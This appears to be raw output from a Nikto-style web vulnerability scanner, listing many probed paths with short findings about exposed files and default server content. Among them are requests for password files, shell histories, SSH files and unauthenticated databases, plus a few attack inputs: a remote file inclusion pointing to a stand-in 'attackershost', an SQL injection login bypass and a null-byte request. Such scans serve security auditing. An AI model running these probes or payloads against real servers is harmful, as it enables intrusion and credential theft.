++ -3092: GET /HyperStat/stat_what.log: /HyperStat/stat_what.log: This might be interesting...
++ -3092: GET /ibill/: /ibill/: This might be interesting...
++ -3092: GET /img/: /img/: This might be interesting...
++ -3092: GET /import/: /import/: This might be interesting...
++ -3092: GET /includes/: /includes/: This might be interesting...
++ -3092: GET /information/: /information/: This might be interesting...
++ -3092: GET /ingreso/: /ingreso/: This might be interesting...
++ -3092: GET /internal/: /internal/: This might be interesting...
++ -3092: GET /jdbc/: /jdbc/: This might be interesting...
++ -3092: GET /jrun/: /jrun/: This might be interesting...
++ -3092: GET /libro/: /libro/: This might be interesting...
++ -3092: GET /log.htm: /log.htm: This might be interesting...
++ -3092: GET /logfiles/: /logfiles/: This might be interesting...
++ -3092: GET /logger/: /logger/: This might be interesting...
++ -3092: GET /logs.txt: /logs.txt: This might be interesting...
++ -3092: GET /logs/: /logs/: This might be interesting...
++ -3092: GET /logs/error_log: /logs/error_log: This might be interesting...
++ -3092: GET /mail/: /mail/: This might be interesting...
++ -3092: GET /master.password: /master.password: This might be interesting...
++ -3092: GET /mbox: /mbox: This might be interesting...
++ -3092: GET /message/: /message/: This might be interesting...
++ -3092: GET /ministats/admin.cgi: /ministats/admin.cgi: This might be interesting...
++ -3092: GET /mp3/: /mp3/: This might be interesting...
++ -3092: GET /msql/: /msql/: This might be interesting...
++ -3092: GET /Msword/: /Msword/: This might be interesting...
++ -3092: GET /netscape/: /netscape/: This might be interesting...
++ -3092: GET /new/: /new/: This might be interesting...
++ -3092: GET /noticias/: /noticias/: This might be interesting...
++ -3092: GET /oracle: /oracle: This might be interesting...
++ -3092: GET /order/: /order/: This might be interesting...
++ -3092: GET /orders/orders.txt: /orders/orders.txt: This might be interesting...
++ -3092: GET /outgoing/: /outgoing/: This might be interesting...
++ -3092: GET /pages/: /pages/: This might be interesting...
++ -3092: GET /passwd: /passwd: This could be interesting...
++ -3092: GET /passwd.adjunct: /passwd.adjunct: This could be interesting...
++ -3092: GET /passwd.txt: /passwd.txt: This could be interesting...
++ -3092: GET /password: /password: This could be interesting...
++ -3092: GET /PDG_Cart/: /PDG_Cart/: This might be interesting...
++ -3092: GET /pix/: /pix/: This might be interesting...
++ -3092: GET /polls: /polls: This might be interesting...
++ -3092: GET /pr0n/: /pr0n/: This might be interesting...
++ -3092: GET /pron/: /pron/: This might be interesting...
++ -3092: GET /pruebas/: /pruebas/: This might be interesting...
++ -3092: GET /public/: /public/: This might be interesting...
++ -3092: GET /purchase/: /purchase/: This might be interesting...
++ -3092: GET /pwd.db: /pwd.db: This might be interesting...
++ -3092: GET /readme: /readme: This might be interesting...
++ -3092: GET /README.TXT: /README.TXT: This might be interesting...
++ -3092: GET /readme.txt: /readme.txt: This might be interesting...
++ -3092: GET /registered/: /registered/: This might be interesting...
++ -3092: GET /reseller/: /reseller/: This might be interesting...
++ -3092: GET /retail/: /retail/: This might be interesting...
++ -3092: GET /sample/: /sample/: This might be interesting...
++ -3092: GET /save/: /save/: This might be interesting...
++ -3092: GET /scratch: /scratch: This might be interesting...
++ -3092: GET /search.vts: /search.vts: This might be interesting...
++ -3092: GET /search97.vts: /search97.vts: This might be interesting...
++ -3092: GET /secret/: /secret/: This might be interesting...
++ -3092: GET /servicios/: /servicios/: This might be interesting...
++ -3092: GET /shop/: /shop/: This might be interesting...
++ -3092: GET /spwd: /spwd: This might be interesting...
++ -3092: GET /ss.cfg: /ss.cfg: This might be interesting...
++ -3092: GET /stat/: /stat/: This might be interesting...
++ -3092: GET /Statistics/: /Statistics/: This might be interesting...
++ -3092: GET /stats.htm: /stats.htm: This might be interesting...
++ -3092: GET /stats.txt: /stats.txt: This might be interesting...
++ -3092: GET /Stats/: /Stats/: This might be interesting...
++ -3092: GET /store/: /store/: This might be interesting...
++ -3092: GET /stylesheet/: /stylesheet/: This might be interesting...
++ -3092: GET /super_stats/access_logs: /super_stats/access_logs: This might be interesting...
++ -3092: GET /support/: /support/: This might be interesting...
++ -3092: GET /sys/: /sys/: This might be interesting...
++ -3092: GET /temp/: /temp/: This might be interesting...
++ -3092: GET /temporal/: /temporal/: This might be interesting...
++ -3092: GET /test.html: /test.html: This might be interesting...
++ -3092: GET /test.txt: /test.txt: This might be interesting...
++ -3092: GET /tests/: /tests/: This might be interesting...
++ -3092: GET /tools/: /tools/: This might be interesting...
++ -3092: GET /trabajo/: /trabajo/: This might be interesting...
++ -3092: GET /trees/: /trees/: This might be interesting...
++ -3092: GET /user/: /user/: This might be interesting...
++ -3092: GET /users/scripts/submit.cgi: /users/scripts/submit.cgi: This might be interesting...
++ -3092: GET /vfs/: /vfs/: This might be interesting...
++ -3092: GET /warez/: /warez/: This might be interesting...
++ -3092: GET /web800fo/: /web800fo/: This might be interesting...
++ -3092: GET /webaccess/access-options.txt: /webaccess/access-options.txt: This might be interesting...
++ -3092: GET /webboard/: /webboard/: This might be interesting...
++ -3092: GET /webcart/: /webcart/: This might be interesting...
++ -3092: GET /weblog/: /weblog/: This might be interesting...
++ -3092: GET /WebShop/templates/cc.txt: /WebShop/templates/cc.txt: This might be interesting...
++ -3092: GET /website/: /website/: This might be interesting...
++ -3092: GET /WebTrend/: /WebTrend/: This might be interesting...
++ -3092: GET /work/: /work/: This might be interesting...
++ -3092: GET /wusage/: /wusage/: This might be interesting...
++ -3092: GET /www/: /www/: This might be interesting...
++ -3092: GET /wwwlog/: /wwwlog/: This might be interesting...
++ -3092: GET /wwwstats/: /wwwstats/: This might be interesting...
++ -3092: GET /wwwthreads/3tvars.pm: /wwwthreads/3tvars.pm: This might be interesting...
++ -3092: GET /advworks/equipment/catalog_type.asp: /advworks/equipment/catalog_type.asp: This might be interesting...
++ -3092: GET /carbo.dll: /carbo.dll: This might be interesting...
++ -17670: GET /clocktower/: /clocktower/: Site Server sample files.  This might be interesting...
++ -17670: GET /market/: /market/: Site Server sample files.  This might be interesting.
++ -3092: GET /scripts/counter.exe: /scripts/counter.exe: This might be interesting...
++ -17669: GET /scripts/cphost.dll: /scripts/cphost.dll: cphost.dll may have a DoS and a traversal issue.
++ -3092: GET /scripts/fpadmcgi.exe: /scripts/fpadmcgi.exe: This might be interesting...
++ -3092: GET /site/iissamples/: /site/iissamples/: This might be interesting...
++ -3092: GET /_mem_bin/: /_mem_bin/: This might be interesting - User Login
++ -3092: GET /perl/files.pl: /perl/files.pl: This might be interesting...
++ -3092: GET /scripts/convert.bas: /scripts/convert.bas: This might be interesting...
++ -3233: GET /cgi-dos/args.bat: /cgi-dos/args.bat: Default FrontPage CGI found.
++ -3092: GET /hostingcontroller/: /hostingcontroller/: This might be interesting...probably HostingController, www.hostingcontroller.com
++ -3092: GET /databases/: /databases/: Databases? Really??
++ -3092: GET /img-sys/: /img-sys/: Default image directory should not allow directory listing.
++ -3092: GET /javadoc/: /javadoc/: Documentation...?
++ -3092: GET /manager/: /manager/: May be a web server or site manager.
++ -3092: GET /account.nsf: /account.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /admin.nsf: /admin.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /admin5.nsf: /admin5.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /archive/l_domlog.nsf: /archive/l_domlog.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /billing.nsf: /billing.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /books.nsf: /books.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /certlog.nsf: /certlog.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /chatlog.nsf: /chatlog.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /cldbdir.nsf: /cldbdir.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /customerdata.nsf: /customerdata.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /database.nsf: /database.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /dclf.nsf: /dclf.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /DEASLog02.nsf: /DEASLog02.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /DEASLog04.nsf: /DEASLog04.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /decsadm.nsf: /decsadm.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /default.nsf: /default.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /doladmin.nsf: /doladmin.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /domadmin.nsf: /domadmin.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /events5.nsf: /events5.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /groups.nsf: /groups.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /help5_client.nsf: /help5_client.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /iNotes/Forms5.nsf/$DefaultNav: /iNotes/Forms5.nsf/$DefaultNav: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /kbccv11.nsf: /kbccv11.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /kbssvv11.nsf: /kbssvv11.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /leilog.nsf: /leilog.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /log4a.nsf: /log4a.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /l_domlog.nsf: /l_domlog.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /mail10.box: /mail10.box: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /mail3.box: /mail3.box: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /mail5.box: /mail5.box: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /mail9.box: /mail9.box: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /msdwda.nsf: /msdwda.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /mtdata/mtstore.nsf: /mtdata/mtstore.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /nntp/nd000002.nsf: /nntp/nd000002.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /nntp/nd000004.nsf: /nntp/nd000004.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /notes.nsf: /notes.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /private.nsf: /private.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /qpadmin.nsf: /qpadmin.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /quickstart/qstart50.nsf: /quickstart/qstart50.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /sample/faqw46: /sample/faqw46: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /sample/pagesw46: /sample/pagesw46: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /sample/site1w4646: /sample/site1w4646: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /secret.nsf: /secret.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /smbcfg.nsf: /smbcfg.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /smency.nsf: /smency.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /smtime.nsf: /smtime.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /smtp.nsf: /smtp.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /smtpobwq.nsf: /smtpobwq.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /srvnam.htm: /srvnam.htm: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /stauths.nsf: /stauths.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /stconf.nsf: /stconf.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /stlog.nsf: /stlog.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /stsrc.nsf: /stsrc.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /today.nsf: /today.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /web.nsf: /web.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3092: GET /welcome.nsf: /welcome.nsf: This database can be read without authentication, which may reveal sensitive information.
++ -3093: GET /finances.xls: /finances.xls: Finance spreadsheet?
++ -3093: GET /add_acl: /add_acl: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /admin/auth.php: /admin/auth.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /admin/cfg/configsite.inc.php+: /admin/cfg/configsite.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /admin/credit_card_info.php: /admin/credit_card_info.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /admin/index.php: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /admin/objects.inc.php4: /admin/objects.inc.php4: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /admin/upload.php: /admin/upload.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /adv/gm001-mc/: /adv/gm001-mc/: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /approval/ts_app.htm: /approval/ts_app.htm: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /auth.inc.php: /auth.inc.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /bandwidth/index.cgi: /bandwidth/index.cgi: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /bigsam_guestbook.php?displayBegin=9999...9999: /bigsam_guestbook.php?displayBegin=9999...9999: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /board/index.php: /board/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /caupo/admin/admin_workspace.php: /caupo/admin/admin_workspace.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /communique.asp: /communique.asp: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /community/index.php?analized=anything: /community/index.php?analized=anything: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /compte.php: /compte.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /cutenews/comments.php: /cutenews/comments.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /cutenews/shownews.php: /cutenews/shownews.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /Data/settings.xml+: /Data/settings.xml+: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /database/metacart.mdb+: /database/metacart.mdb+: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /dbabble: /dbabble: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /defines.php: /defines.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /doc/admin/index.php: /doc/admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /dotproject/modules/projects/view.php: /dotproject/modules/projects/view.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /dotproject/modules/tasks/addedit.php: /dotproject/modules/tasks/addedit.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /do_map: /do_map: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /emumail.cgi?type=.%00: /emumail.cgi?type=.%00: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /enteteacceuil.php: /enteteacceuil.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /eventcal2.php.php: /eventcal2.php.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /faqman/index.php: /faqman/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /filemgmt/brokenfile.php: /filemgmt/brokenfile.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /filemgmt/viewcat.php: /filemgmt/viewcat.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /forum/newthread.php: /forum/newthread.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -10447: GET /get_od_toc.pl?Profile=: /get_od_toc.pl?Profile=: WebTrends get_od_toc.pl may be vulnerable to a path disclosure error if this file is reloaded multiple times.
++ -3093: GET /globals.pl: /globals.pl: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /homebet/homebet.dll?form=menu&amp;option=menu-signin: /homebet/homebet.dll?form=menu&amp;option=menu-signin: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /includes/footer.php3: /includes/footer.php3: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /infos/faq/index.asp: /infos/faq/index.asp: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /intranet/browse.php: /intranet/browse.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /ipchat.php: /ipchat.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /livredor/index.php: /livredor/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /mail/include.html: /mail/include.html: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /mail/src/read_body.php: /mail/src/read_body.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /mantis/summary_graph_functions.php?g_jpgraph_path=http%3A%2F%2Fattackershost%2Flistings.txt%3F: /mantis/summary_graph_functions.php?g_jpgraph_path=http%3A%2F%2Fattackershost%2Flistings.txt%3F: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /members/ID.pm: /members/ID.pm: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /modif/delete.php: /modif/delete.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /modules/Forums/attachment.php: /modules/Forums/attachment.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /modules/WebChat/in.php+: /modules/WebChat/in.php+: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /modules/Your_Account/navbar.php+: /modules/Your_Account/navbar.php+: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /msadc/Samples/SELECTOR/showcode.asp?|-|0|404_Object_Not_Found: /msadc/Samples/SELECTOR/showcode.asp?|-|0|404_Object_Not_Found: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /myguestBk/admin/delEnt.asp?id=NEWSNUMBER|-|0|404_Object_Not_Found: /myguestBk/admin/delEnt.asp?id=NEWSNUMBER|-|0|404_Object_Not_Found: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /nphp/nphpd.php: /nphp/nphpd.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /options.inc.php+: /options.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /parse_xml.cgi: /parse_xml.cgi: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /php/php4ts.dll: /php/php4ts.dll: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /pm/lib.inc.php: /pm/lib.inc.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /poppassd.php3+: /poppassd.php3+: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /produccart/pdacmin/login.asp?|-|0|404_Object_Not_Found: /produccart/pdacmin/login.asp?|-|0|404_Object_Not_Found: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /productcart/pc/Custva.asp?|-|0|404_Object_Not_Found: /productcart/pc/Custva.asp?|-|0|404_Object_Not_Found: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /protected/: /protected/: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /protectedpage.php?uid=&#039;%20OR%20&#039;&#039;=&#039;&amp;pwd=&#039;%20OR%20&#039;&#039;=&#039;: /protectedpage.php?uid=&#039;%20OR%20&#039;&#039;=&#039;&amp;pwd=&#039;%20OR%20&#039;&#039;=&#039;: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /room/save_item.php: /room/save_item.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /scripts/tradecli.dll: /scripts/tradecli.dll: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /security/web_access.html: /security/web_access.html: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /servers/link.cgi: /servers/link.cgi: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /shop/php_files/site.config.php+: /shop/php_files/site.config.php+: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /staticpages/index.php: /staticpages/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /sw000.asp?|-|0|404_Object_Not_Found: /sw000.asp?|-|0|404_Object_Not_Found: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /technote/print.cgi: /technote/print.cgi: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /tinymsg.php: /tinymsg.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /ttforum/index.php: /ttforum/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /tutos/file/file_select.php: /tutos/file/file_select.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /uifc/MultFileUploadHandler.php+: /uifc/MultFileUploadHandler.php+: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /utils/sprc.asp+: /utils/sprc.asp+: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /vars.inc+: /vars.inc+: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /VBZooM/add-subject.php: /VBZooM/add-subject.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /wbboard/reply.php: /wbboard/reply.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /webmail/src/read_body.php: /webmail/src/read_body.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /XMBforum/buddy.php: /XMBforum/buddy.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /x_stat_admin.php: /x_stat_admin.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /_head.php: /_head.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /ows-bin/oasnetconf.exe?-l%20-s%20BlahBlah: /ows-bin/oasnetconf.exe?-l%20-s%20BlahBlah: This might be interesting... has been seen in web logs from an unknown scanner.
++ -3093: GET /database/: /database/: Databases? Really??
++ -3093: GET /.wwwacl: /.wwwacl: Contains authorization information
++ -3093: GET /.www_acl: /.www_acl: Contains authorization information
++ -3093: GET /.access: /.access: Contains authorization information
++ -3093: GET /.bashrc: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
++ -3093: GET /.forward: /.forward: User home dir was found with a mail forward file. May reveal where the user's mail is being forwarded to.
++ -3093: GET /.history: /.history: A user's home directory may be set to the web root, the shell history was retrieved. This should not be accessible via the web.
++ -3093: GET /.htaccess: /.htaccess: Contains authorization information
++ -3093: GET /.mysql_history: /.mysql_history: Database SQL?
++ -3093: GET /.pinerc: /.pinerc: User home dir found with a PINE rc file. May reveal system information, directories and more.
++ -3093: GET /.proclog: /.proclog: User home dir with a Procmail log file. May reveal user mail traffic, directories and more.
++ -3093: GET /.procmailrc: /.procmailrc: User home dir with a Procmail rc file. May reveal subdirectories, mail contacts and more.
++ -3093: GET /.profile: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
++ -3093: GET /.sh_history: /.sh_history: A user's home directory may be set to the web root, the shell history was retrieved. This should not be accessible via the web.
++ -3093: GET /.ssh/known_hosts: /.ssh/known_hosts: A user's home directory may be set to the web root, an ssh file was retrieved. This should not be accessible via the web.
++ -3233: GET /jservdocs/: /jservdocs/: Default Apache JServ docs should be removed.
++ -3233: GET /ojspdemos/basic/simple/usebean.jsp: /ojspdemos/basic/simple/usebean.jsp: Oracle 9i default JSP page found, may be vulnerable to XSS in any field.
++ -3233: GET /servlet/HelloWorldServlet: /servlet/HelloWorldServlet: JRun default servlet found. All default code should be removed from servers.
++ -3233: GET /servlet/SessionServlet: /servlet/SessionServlet: JRun or Netware WebSphere default servlet found. All default code should be removed from servers.
++ -3233: GET /servlet/SnoopServlet: /servlet/SnoopServlet: JRun, Netware Java Servlet Gateway, or WebSphere default servlet found. All default code should be removed from servers.
++ -3233: GET /admcgi/scripts/Fpadmcgi.exe: /admcgi/scripts/Fpadmcgi.exe: Default FrontPage CGI found.
++ -3233: GET /bin/admin.pl: /bin/admin.pl: Default FrontPage CGI found.
++ -3233: GET /bin/CGImail.exe: /bin/CGImail.exe: Default FrontPage CGI found.
++ -3233: GET /bin/fpsrvadm.exe: /bin/fpsrvadm.exe: Default FrontPage CGI found.
++ -3233: GET /cgi-bin/cfgwiz.exe: /cgi-bin/cfgwiz.exe: Default FrontPage CGI found.
++ -3233: GET /cgi-bin/contents.htm: /cgi-bin/contents.htm: Default FrontPage CGI found.
++ -3233: GET /scripts/admin.pl: /scripts/admin.pl: Default FrontPage CGI found.
++ -3233: GET /scripts/CGImail.exe: /scripts/CGImail.exe: Default FrontPage CGI found.
++ -3233: GET /scripts/fpadmin.htm: /scripts/fpadmin.htm: Default FrontPage CGI found.
++ -3233: GET /_private/: /_private/: FrontPage directory found.
++ -3233: GET /_private/registrations.txt: /_private/registrations.txt: Default FrontPage file found.
++ -3233: GET /_vti_bin/: /_vti_bin/: FrontPage directory found.
++ -3233: GET /_vti_bin/cfgwiz.exe: /_vti_bin/cfgwiz.exe: Default FrontPage CGI found.
++ -3233: GET /_vti_bin/contents.htm: /_vti_bin/contents.htm: Default FrontPage CGI found.
++ -3233: GET /_vti_bin/_vti_cnf/: /_vti_bin/_vti_cnf/: FrontPage directory found.
++ -3233: GET /_vti_pvt/authors.pwd: /_vti_pvt/authors.pwd: Default FrontPage file found, may be a password file.
++ -3233: GET /_vti_pvt/service.pwd: /_vti_pvt/service.pwd: Default FrontPage file found, may be a password file.
++ -3233: GET /_vti_pvt/users.pwd: /_vti_pvt/users.pwd: Default FrontPage file found, may be a password file.
++ -3233: GET /help/contents.htm: /help/contents.htm: Default Netscape manual found. All default pages should be removed.
++ -3233: GET /manual/ag/esperfrm.htm: /manual/ag/esperfrm.htm: Default Netscape manual found. All default pages should be removed.
++ -3233: GET /com/novell/webpublisher/help/en/default.htm: /com/novell/webpublisher/help/en/default.htm: Netware web publisher documentation found. All default documentation should be removed from web servers.
++ -3233: GET /servlet/gwmonitor: /servlet/gwmonitor: Netware Gateway monitor found. All default code should be removed from web servers.
++ -3233: GET /servlet/SearchServlet: /servlet/SearchServlet: Novell Netware default servlet found. All default code should be removed from the system.
++ -3233: GET /servlet/webacc: /servlet/webacc: Netware Enterprise and/or GroupWise web access found. All default code should be removed from Internet servers.
++ -3233: GET /WebSphereSamples: /WebSphereSamples: Netware Webshere sample applications found. All default code should be removed from web servers.
++ -3233: GET /doc/dspug.nsf: /doc/dspug.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /doc/internet.nsf: /doc/internet.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /doc/lccon.nsf: /doc/lccon.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /doc/npn_admn.nsf: /doc/npn_admn.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /doc/smhelp.nsf: /doc/smhelp.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /domguide.nsf: /domguide.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /help/domguide.nsf: /help/domguide.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /help/helplt4.nsf: /help/helplt4.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /help/javapg.nsf: /help/javapg.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /help/migrate.nsf: /help/migrate.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /help/readmes.nsf: /help/readmes.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /help/srvinst.nsf: /help/srvinst.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /helpadmin.nsf: /helpadmin.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /lccon.nsf: /lccon.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /npn_admn.nsf: /npn_admn.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /readmec.nsf: /readmec.nsf: This documentation database can be read without authentication. All default files should be removed.
++ -3233: GET /index.html.cz.iso8859-2: /index.html.cz.iso8859-2: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information.
++ -3233: GET /index.html.en: /index.html.en: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information.
++ -3233: GET /index.html.es: /index.html.es: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information.
++ -3233: GET /index.html.fr: /index.html.fr: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information.
++ -3233: GET /index.html.hr.iso8859-2: /index.html.hr.iso8859-2: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information.
++ -3233: GET /index.html.lu.utf8: /index.html.lu.utf8: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information.
++ -3233: GET /index.html.nl: /index.html.nl: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information.
